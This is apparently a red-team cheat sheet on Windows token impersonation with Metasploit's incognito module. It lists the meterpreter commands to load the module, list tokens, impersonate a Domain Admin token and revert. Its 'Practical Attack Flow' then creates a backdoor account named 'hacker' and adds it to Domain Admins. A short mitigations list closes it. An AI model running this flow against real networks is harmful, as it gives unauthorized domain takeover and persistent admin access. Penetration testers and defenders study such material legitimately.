# Token Impersonation

Steal security tokens from logged-in users to impersonate them. Requires local admin on the target machine.

## How Tokens Work

- **Delegate tokens** -- Created for interactive logins (RDP, physical logon)
- **Impersonate tokens** -- Created for non-interactive sessions (network drives, scripts)

Tokens persist until reboot. If a Domain Admin logs into a machine you have admin on, their token is available to steal.

## Using Incognito (Metasploit)

### Setup

```bash
# From a meterpreter session
load incognito
```

### List Available Tokens

```bash
list_tokens -u
```

Look for high-value tokens (Domain Admins, service accounts).

### Impersonate a Token

```bash
impersonate_token DOMAIN\\username
```

**Note:** Double backslash is required in the domain\user format.

### Verify

```bash
# Check who you are now
getuid

# Try to access domain resources
shell
whoami
```

### Revert

```bash
rev2self
```

## Practical Attack Flow

1. Compromise a machine with local admin
2. Get meterpreter shell (psexec module)
3. Load incognito
4. List tokens -- look for Domain Admin
5. Impersonate the DA token
6. Add yourself as Domain Admin:

```bash
# From the impersonated shell
net user /add hacker Password123 /domain
net group "Domain Admins" hacker /ADD /domain
```

## Mitigations

- Limit Domain Admin logons to Domain Controllers only
- Use tiered admin model (don't log into workstations with DA creds)
- Regularly reboot machines to clear tokens
- Monitor for token manipulation events
